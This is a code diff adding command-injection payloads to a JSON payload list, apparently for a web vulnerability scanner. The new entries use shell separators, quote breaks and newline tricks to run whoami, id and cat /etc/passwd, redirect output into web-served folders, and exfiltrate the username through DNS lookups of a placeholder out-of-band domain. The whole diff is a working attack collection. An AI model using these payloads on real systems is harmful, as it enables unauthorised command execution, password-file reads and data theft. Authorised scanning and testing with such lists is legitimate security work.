@@ -132,6 +132,44 @@
         {"payload": "; id", "type": "Linux semicolon id signature", "signatures": ["uid=0(root)", "gid=0(root)", "uid="]},
         {"payload": "|| id", "type": "Linux OR id signature", "signatures": ["uid=0(root)", "gid=0(root)", "uid="]},
         {"payload": "; cat /etc/passwd", "type": "Linux semicolon passwd", "signatures": ["root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:"]},
-        {"payload": "|| cat /etc/passwd", "type": "Linux OR passwd", "signatures": ["root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:"]}
+        {"payload": "|| cat /etc/passwd", "type": "Linux OR passwd", "signatures": ["root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:"]},
+
+        {"payload": "||whoami>/var/www/images/{OUTFILE}||", "type": "Linux output-redirect double-OR whoami", "category": "redirect", "writable_dir": "/var/www/images/", "command": "whoami"},
+        {"payload": ";whoami>/var/www/images/{OUTFILE}", "type": "Linux output-redirect semicolon whoami", "category": "redirect", "writable_dir": "/var/www/images/", "command": "whoami"},
+        {"payload": "|whoami>/var/www/images/{OUTFILE}", "type": "Linux output-redirect pipe whoami", "category": "redirect", "writable_dir": "/var/www/images/", "command": "whoami"},
+        {"payload": "`whoami>/var/www/images/{OUTFILE}`", "type": "Linux output-redirect backtick whoami", "category": "redirect", "writable_dir": "/var/www/images/", "command": "whoami"},
+        {"payload": "$(whoami>/var/www/images/{OUTFILE})", "type": "Linux output-redirect subshell whoami", "category": "redirect", "writable_dir": "/var/www/images/", "command": "whoami"},
+        {"payload": "||id>/var/www/images/{OUTFILE}||", "type": "Linux output-redirect double-OR id", "category": "redirect", "writable_dir": "/var/www/images/", "command": "id"},
+        {"payload": ";id>/var/www/images/{OUTFILE}", "type": "Linux output-redirect semicolon id", "category": "redirect", "writable_dir": "/var/www/images/", "command": "id"},
+        {"payload": "||cat /etc/passwd>/var/www/images/{OUTFILE}||", "type": "Linux output-redirect double-OR passwd", "category": "redirect", "writable_dir": "/var/www/images/", "command": "cat /etc/passwd"},
+
+        {"payload": "||whoami>/var/www/html/uploads/{OUTFILE}||", "type": "Linux output-redirect uploads whoami", "category": "redirect", "writable_dir": "/var/www/html/uploads/", "command": "whoami"},
+        {"payload": "||whoami>/tmp/{OUTFILE}||", "type": "Linux output-redirect tmp whoami", "category": "redirect", "writable_dir": "/tmp/", "command": "whoami"},
+
+        {"payload": "||nslookup {OOB_DOMAIN}||", "type": "Linux OOB nslookup double-OR", "category": "oob_interaction"},
+        {"payload": ";nslookup {OOB_DOMAIN}", "type": "Linux OOB nslookup semicolon", "category": "oob_interaction"},
+        {"payload": "|nslookup {OOB_DOMAIN}", "type": "Linux OOB nslookup pipe", "category": "oob_interaction"},
+        {"payload": "`nslookup {OOB_DOMAIN}`", "type": "Linux OOB nslookup backtick", "category": "oob_interaction"},
+        {"payload": "$(nslookup {OOB_DOMAIN})", "type": "Linux OOB nslookup subshell", "category": "oob_interaction"},
+        {"payload": "||nslookup+{OOB_DOMAIN}||", "type": "Linux OOB nslookup plus-encoded double-OR", "category": "oob_interaction"},
+        {"payload": "||dig {OOB_DOMAIN}||", "type": "Linux OOB dig double-OR", "category": "oob_interaction"},
+        {"payload": "||curl {OOB_DOMAIN}||", "type": "Linux OOB curl double-OR", "category": "oob_interaction"},
+        {"payload": "&nslookup {OOB_DOMAIN}&", "type": "Windows OOB nslookup ampersand", "category": "oob_interaction"},
+        {"payload": "&&nslookup {OOB_DOMAIN}", "type": "Windows OOB nslookup double-AND", "category": "oob_interaction"},
+        {"payload": "';nslookup {OOB_DOMAIN};'", "type": "Linux OOB nslookup quote-break", "category": "oob_interaction"},
+        {"payload": "\";nslookup {OOB_DOMAIN};\"", "type": "Linux OOB nslookup dquote-break", "category": "oob_interaction"},
+        {"payload": "%0anslookup {OOB_DOMAIN}", "type": "Linux OOB nslookup newline", "category": "oob_interaction"},
+
+        {"payload": "||nslookup `whoami`.{OOB_DOMAIN}||", "type": "Linux OOB exfil whoami backtick double-OR", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": ";nslookup `whoami`.{OOB_DOMAIN}", "type": "Linux OOB exfil whoami backtick semicolon", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": "|nslookup `whoami`.{OOB_DOMAIN}", "type": "Linux OOB exfil whoami backtick pipe", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": "||nslookup $(whoami).{OOB_DOMAIN}||", "type": "Linux OOB exfil whoami subshell double-OR", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": ";nslookup $(whoami).{OOB_DOMAIN}", "type": "Linux OOB exfil whoami subshell semicolon", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": "||nslookup+`whoami`.{OOB_DOMAIN}||", "type": "Linux OOB exfil whoami plus-encoded double-OR", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": "||dig `whoami`.{OOB_DOMAIN}||", "type": "Linux OOB exfil whoami dig double-OR", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": "';nslookup `whoami`.{OOB_DOMAIN};'", "type": "Linux OOB exfil whoami quote-break", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": "\";nslookup `whoami`.{OOB_DOMAIN};\"", "type": "Linux OOB exfil whoami dquote-break", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": "%0anslookup `whoami`.{OOB_DOMAIN}", "type": "Linux OOB exfil whoami newline", "category": "oob_exfil", "exfil_cmd": "whoami"},
+        {"payload": "&nslookup %USERNAME%.{OOB_DOMAIN}&", "type": "Windows OOB exfil username ampersand", "category": "oob_exfil", "exfil_cmd": "username"}
     ]
 }
